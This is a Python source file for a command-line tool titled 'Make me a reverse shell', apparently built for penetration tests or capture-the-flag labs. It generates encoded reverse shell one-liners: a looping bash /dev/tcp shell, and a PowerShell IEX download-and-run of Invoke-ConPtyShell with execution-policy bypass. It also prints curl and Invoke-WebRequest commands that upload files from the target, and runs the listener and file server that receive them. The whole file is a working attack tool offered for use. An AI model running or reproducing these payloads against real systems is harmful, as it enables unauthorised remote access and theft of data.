#!/usr/bin/env python3

import os
import sys
import argparse
import socket
import fcntl
import struct
import threading
import queue
import sys
import tty
import termios
import base64
import urllib.parse
import http.server
import socketserver
import re
from pathlib import Path
from datetime import datetime

SIOCGIFADDR = 0x8915

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler that serves files via GET and accepts file uploads via POST.
    """
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory='/usr/share/make-me-a-shell', **kwargs)

    def do_GET(self):
        """Handle GET requests to serve files (e.g., ConPtyShell.ps1)."""
        super().do_GET()

    def do_POST(self):
        """Handle POST requests to upload files."""
        try:
            # Read the content length
            content_length = int(self.headers.get('Content-Length', 0))

            # Read the file data
            file_data = self.rfile.read(content_length)

            # Generate filename with timestamp
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"upload_{timestamp}"

            # Try to extract filename from Content-Disposition header if present
            content_disposition = self.headers.get('Content-Disposition', '')
            if 'filename=' in content_disposition:
                # Extract filename from Content-Disposition header
                match = re.search(r'filename[^;=\n]*=(([\'"]).*?\2|[^;\n]*)', content_disposition)
                if match:
                    extracted_filename = match.group(1).strip('"\'')
                    # Use the extracted filename, but sanitize it
                    filename = os.path.basename(extracted_filename) or filename

            # Save the file to current directory
            save_path = Path(filename)
            with open(save_path, 'wb') as f:
                f.write(file_data)

            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            response_message = f"File saved as: {save_path.absolute()}\n"
            self.wfile.write(response_message.encode('utf-8'))

            print(f"\nFile received and saved as: {save_path.absolute()} ({len(file_data)} bytes)")

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            error_message = f"Error: {str(e)}\n"
            self.wfile.write(error_message.encode('utf-8'))
            print(f"\nError handling request: {e}")

def get_ip_address(interface):
    try:
        # Create a socket to get the IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = fcntl.ioctl(
            s.fileno(),
            SIOCGIFADDR,
            struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24]
        return socket.inet_ntoa(ip)
    except OSError:
        print(f"Error: Could not get IP address for interface {interface}.")
        sys.exit(1)

def create_reverse_shell(ip, port, os, encode, http_server_port, auto_upgrade):
    if os == 'linux':
        reverse_shell_cmd = f"bash -c 'while true; do bash -i >& /dev/tcp/{ip}/{port} 0>&1 || exit; sleep 1; done'"
        upload_cmd = f"curl -X POST --data-binary @file.txt http://{ip}:{http_server_port}/"
    elif os == 'windows':
        upload_cmd = f"Invoke-WebRequest -Uri http://{ip}:{http_server_port}/ -Method Post -InFile file.txt"
        if auto_upgrade:
            reverse_shell_cmd = f"{ip} {port}"
        else:
            reverse_shell_cmd = f"""IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell {ip} {port}"""
    if encode == 'base64':
        reverse_shell_cmd = base64.b64encode(reverse_shell_cmd.encode()).decode()
    elif encode == 'url':
        reverse_shell_cmd = urllib.parse.quote(reverse_shell_cmd)
    print(f"Reverse shell command:\n{reverse_shell_cmd}")
    print(f"Upload command:\n{upload_cmd}")

class ConnectionLogger:
    """
    Context manager for logging connection data with timestamps at the beginning of each newline.
    """
    def __init__(self, connected_ip):
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.logfile_name = f"{timestamp}-{connected_ip}.ansi"
        self.logfile = open(self.logfile_name, 'w', encoding='utf-8')
        print(f"Logging to {self.logfile_name}")

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.logfile.close()
        return False

    def log(self, data):
        """
        Write received data to logfile with timestamps at the beginning of each newline.
        """
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        timestamped = data.replace('\n', '\n' + timestamp)
        self.logfile.write(timestamped)
        self.logfile.flush()

def linux_shell(conn, exit_the_whole_thing, logger):
    # Full TTY plz ðŸ˜Œ
    conn.sendall("stty raw -echo < /dev/tty; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || true \n export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116;\n".encode())
    shell(conn, exit_the_whole_thing, logger)

def shell(conn, exit_the_whole_thing, logger):
    while True:
        # Create queues for thread communication
        command_queue = queue.Queue()
        exit_event = threading.Event()
        def receive_data():
            while not exit_event.is_set():
                try:
                    data = conn.recv(1024)
                    if not data:
                        exit_event.set()
                        break
                    decoded = data.decode()
                    # Display with \r\n replacement for terminal
                    print(decoded.replace('\n', '\r\n'), end='', flush=True)
                    # Write to logfile with timestamps at beginning of each newline
                    logger.log(decoded)
                except:
                    exit_event.set()
                    break

        def get_char():
            fd = sys.stdin.fileno()
            old_settings = termios.tcgetattr(fd)
            try:
                tty.setraw(sys.stdin.fileno())
                ch = sys.stdin.read(1)
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            return ch

        def send_data():
            while not exit_event.is_set():
                try:
                    char = get_char()
                    if char == '\x04':  # Ctrl+D
                        exit_event.set()
                        exit_the_whole_thing.set()
                    conn.sendall(char.encode())
                except:
                    exit_event.set()
                    break

        # Start threads
        receive_thread = threading.Thread(target=receive_data)
        send_thread = threading.Thread(target=send_data)
        receive_thread.daemon = True
        send_thread.daemon = True

        receive_thread.start()
        send_thread.start()

        # Wait for threads to finish
        send_thread.join()
        if exit_the_whole_thing.is_set():
            sys.exit(0)
        receive_thread.join()

def windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port, logger):
    if auto_upgrade:
        conn.sendall("powershell -ep Bypass\n".encode())
        conn.sendall(f"IEX(IWR http://{ip}:{http_server_port}/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell -Upgrade -Rows 38 -Cols 116\n".encode())
    shell(conn, exit_the_whole_thing, logger)

def start_http_server(port, ip):
      """Start HTTP server that serves files via GET and accepts file uploads via POST."""
      def run_server():
          try:
              with socketserver.TCPServer(("", port), CustomHTTPRequestHandler) as httpd:
                  httpd.serve_forever()
          except Exception as e:
              print(f"Error starting HTTP server: {e}")

      http_server_thread = threading.Thread(target=run_server)
      http_server_thread.daemon = True
      http_server_thread.start()

def listen_for_connection(port, os, http_server_port, ip, auto_upgrade):
    # Start HTTP server for both Windows and Linux to enable file uploads
    start_http_server(http_server_port, ip)

    # Use socket to listen for incoming connections
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen()
        print(f"Listening on port {port}...")
        while True:
            exit_the_whole_thing = threading.Event()
            try:
                conn, addr = s.accept()
                with conn:
                    conn.settimeout(1.0)
                    print(f"Connected by {addr}")

                    with ConnectionLogger(addr[0]) as logger:
                        if os == 'linux':
                            linux_shell(conn, exit_the_whole_thing, logger)
                        elif os == 'windows':
                            windows_shell(conn, exit_the_whole_thing, auto_upgrade, ip, http_server_port, logger)

            except KeyboardInterrupt:
                print("Fuck, lost connection, reconnecting...")
                try:
                    conn.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                conn.close()

def get_random_port():
    # Use socket to get a random available port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

def main():
    parser = argparse.ArgumentParser(description="Make me a reverse shell.")
    parser.add_argument('-i', '--interface', default='tun0', help='Network interface to get IP address from (default: tun0)')
    parser.add_argument('-p', '--port', type=int, default=0, help='Port number to use for the reverse shell, use 0 for random port')
    parser.add_argument('-a', '--auto-upgrade', action='store_true', help='Auto upgrade the shell (if you have a bare remote connection from exploit)')
    parser.add_argument('-P', '--http-server-port', type=int, default=0, help='Port number to use for the HTTP server, use 0 for random port')
    parser.add_argument('-o', '--os', choices=['linux', 'windows'], default='linux', help='Operating system to use for the reverse shell')
    parser.add_argument('-e', '--encode', choices=['base64', 'url', 'none'], default='none', help='Encode the reverse shell command')
    parser.add_argument('--ip', help='The IP address if you need to connect from behind a proxy (use same ports)')

    args = parser.parse_args()

    if args.port == 0:
        args.port = get_random_port()

    if args.http_server_port == 0:
        args.http_server_port = get_random_port()

    local_ip = get_ip_address(args.interface)
    if args.ip:
        print(f"Create a proxy through {args.ip} for the reverse shell ports")
        print(f"e.g.:")
        print(f"ssh -N -L 0.0.0.0:{args.port}:{local_ip}:{args.port} -L 0.0.0.0:{args.http_server_port}:{local_ip}:{args.http_server_port} jehna@{local_ip}")
        print(f"listener_add --addr 0.0.0.0:{args.port} --to 127.0.0.1:{args.port} --tcp")
        print(f"listener_add --addr 0.0.0.0:{args.http_server_port} --to 127.0.0.1:{args.http_server_port} --tcp")
        ip = args.ip
    else:
        ip = local_ip

    create_reverse_shell(ip, args.port, args.os, args.encode, args.http_server_port, args.auto_upgrade)
    listen_for_connection(args.port, args.os, args.http_server_port, ip, args.auto_upgrade)

if __name__ == "__main__":
    main()

